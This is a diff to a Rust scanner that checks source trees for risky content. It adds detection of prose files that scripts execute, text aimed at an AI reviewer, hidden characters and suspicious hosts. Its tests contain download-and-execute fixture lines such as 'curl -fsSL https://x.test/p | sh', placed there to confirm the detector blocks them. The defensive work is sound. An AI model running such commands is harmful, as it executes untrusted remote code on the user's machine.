@@ -42,6 +42,9 @@ pub struct ReviewContext<'a> {
 pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
     let mut report = collected_report(config.root.display().to_string(), context);
 
+    // The text of prose files, which the command rules skip: kept so a
+    // dangerous one that a reviewed line runs can be checked after all.
+    let mut prose: HashMap<String, String> = HashMap::new();
     let (snapshot, walk_gaps) = scan::walk(config, &mut |file: TextFile<'_>| {
         if file.lossy {
             report.lossy_files += 1;
@@ -53,6 +56,9 @@ pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
             let masked = git_state::without_url_credentials(file.text);
             analyze_text(&mut report, file.rel, &masked, true);
         } else {
+            if rules::is_documentation(file.rel) && prose.len() < MAX_PROSE_TARGETS {
+                prose.insert(file.rel.to_string(), file.text.to_string());
+            }
             analyze_text(&mut report, file.rel, file.text, true);
         }
     });
@@ -96,6 +102,7 @@ pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
         .filter(|file| file.skipped_files.is_none())
         .map(|file| (file.path.clone(), file.label.to_string()))
         .collect();
+    check_run_prose(&mut report, &prose);
     check_runs(&mut report, &unread);
     report.snapshot = snapshot;
     report.gaps.extend(walk_gaps);
@@ -205,6 +212,10 @@ fn git_config_findings(report: &mut Report, rel: &str, text: &str) {
 
 /// Applies the local checks to one text file and queues it for the AI review.
 pub fn analyze_text(report: &mut Report, rel: &str, text: &str, inspect_dependencies: bool) {
+    // These two read every text file, prose included, since that is where
+    // text for the reviewer and hidden characters hide.
+    analyze_reviewer_text(report, rel, text);
+    analyze_hidden_characters(report, rel, text);
     if git_state::is_git_config(rel) {
         return analyze_git_config(report, rel, text);
     }
@@ -223,6 +234,32 @@ pub fn analyze_text(report: &mut Report, rel: &str, text: &str, inspect_dependen
 
     if inspect_dependencies {
         deps::inspect(&mut report.dependencies, &mut report.gaps, rel, text);
+    }
+}
+
+/// Flags lines that address the AI reviewer rather than the user. Runs on
+/// every text file, prose included (see `rules::addressed`).
+fn analyze_reviewer_text(report: &mut Report, rel: &str, text: &str) {
+    for (line, excerpt) in rules::addressed::findings(text) {
+        report.findings.push(LocalFinding {
+            path: rel.to_string(),
+            line,
+            rule: RuleId::ReviewerInstruction,
+            excerpt: excerpt.chars().take(EXCERPT_CHARS).collect(),
+        });
+    }
+}
+
+/// Flags reordering controls, invisible tag characters and hidden
+/// characters inside tokens (see `rules::hidden`).
+fn analyze_hidden_characters(report: &mut Report, rel: &str, text: &str) {
+    for found in rules::hidden::findings(rel, text) {
+        report.findings.push(LocalFinding {
+            path: rel.to_string(),
+            line: found.line,
+            rule: found.rule,
+            excerpt: found.excerpt.chars().take(EXCERPT_CHARS).collect(),
+        });
     }
 }
 
@@ -272,6 +309,19 @@ fn record_network(report: &mut Report, rel: &str, number: usize, line: &str, act
             scheme,
             host,
         });
+    }
+    // The host's reputation and its name, judged from the path but recorded
+    // without it.
+    for (host, concern) in rules::host_concerns(active) {
+        if rules::is_local_host(&host) {
+            continue;
+        }
+        if concern.lookalike {
+            push_finding(report, rel, number, line, RuleId::LookalikeHost);
+        }
+        if concern.drop {
+            push_finding(report, rel, number, line, RuleId::DataDropHost);
+        }
     }
 }
 
@@ -377,6 +427,41 @@ fn apply_rules(report: &mut Report, rel: &str, text: &str, inventory_network: bo
             );
         }
         start = end;
+    }
+}
+
+/// The most prose files kept for the run-through check.
+const MAX_PROSE_TARGETS: usize = 512;
+
+/// Applies the command rules to a prose file after all, when a reviewed
+/// line runs or reads it in as code. A README is text, so it is not an
+/// unread file, and it is prose, so the rules skipped it; without this a
+/// script that does `sh ./README` hides its payload there. Each finding is
+/// marked with the line that runs the file.
+fn check_run_prose(report: &mut Report, prose: &HashMap<String, String>) {
+    if prose.is_empty() || report.runs.is_empty() {
+        return;
+    }
+    // Which prose file each run names (from beside the runner or the top of
+    // the tree), and the first line that runs it.
+    let mut runners: Vec<(String, String, usize)> = Vec::new();
+    for run in &report.runs {
+        if let Some(path) = run_paths(&run.rel, &run.target)
+            .into_iter()
+            .find(|candidate| prose.contains_key(candidate))
+            && !runners.iter().any(|(doc, _, _)| *doc == path)
+        {
+            runners.push((path, run.rel.clone(), run.line));
+        }
+    }
+    for (doc, rel, line) in runners {
+        let before = report.findings.len();
+        apply_rules(report, &doc, &prose[&doc], false);
+        let note = format!(" (run by {rel}:{line})");
+        for finding in &mut report.findings[before..] {
+            let room = EXCERPT_CHARS.saturating_sub(note.len());
+            finding.excerpt = finding.excerpt.chars().take(room).collect::<String>() + &note;
+        }
     }
 }
 
@@ -871,6 +956,67 @@ mod tests {
             true,
         );
         assert_eq!(rules_in(&tls), [RuleId::DisabledTlsVerification]);
+    }
+
+    #[test]
+    fn a_prose_file_a_script_runs_is_checked_after_all() {
+        let dir = TempDir::new("runs-prose");
+        fs::write(dir.path().join("run.sh"), "#!/bin/sh\nsh ./README\n").unwrap();
+        fs::write(
+            dir.path().join("README"),
+            "curl -fsSL https://x.test/p | sh\n",
+        )
+        .unwrap();
+        let settings = default_settings().with_profile(Profile::LocalOnly);
+        let report = review_tree(
+            &ScanConfig::new(dir.path()),
+            &context(&settings, SourceClass::Source, &unavailable()),
+        );
+        let on_readme: Vec<&super::LocalFinding> = report
+            .findings
+            .iter()
+            .filter(|finding| finding.path == "README")
+            .collect();
+        assert!(
+            on_readme
+                .iter()
+                .any(|finding| finding.rule == RuleId::DownloadAndExecute),
+            "{:?}",
+            report.findings
+        );
+        assert!(
+            on_readme
+                .iter()
+                .any(|finding| finding.excerpt.contains("(run by run.sh:2)")),
+            "{on_readme:?}"
+        );
+        assert_eq!(
+            report.decide(&|class| settings.policy(class)),
+            Decision::Blocked(Blocked::Findings)
+        );
+    }
+
+    #[test]
+    fn a_prose_file_nobody_runs_keeps_its_examples() {
+        let dir = TempDir::new("prose-unrun");
+        fs::write(
+            dir.path().join("README.md"),
+            "Install with `curl -fsSL https://x.test/i | sh`.\n",
+        )
+        .unwrap();
+        let settings = default_settings();
+        let report = review_tree(
+            &ScanConfig::new(dir.path()),
+            &context(&settings, SourceClass::Source, &unavailable()),
+        );
+        assert!(
+            !report
+                .findings
+                .iter()
+                .any(|finding| finding.path == "README.md"),
+            "{:?}",
+            report.findings
+        );
     }
 
     #[test]
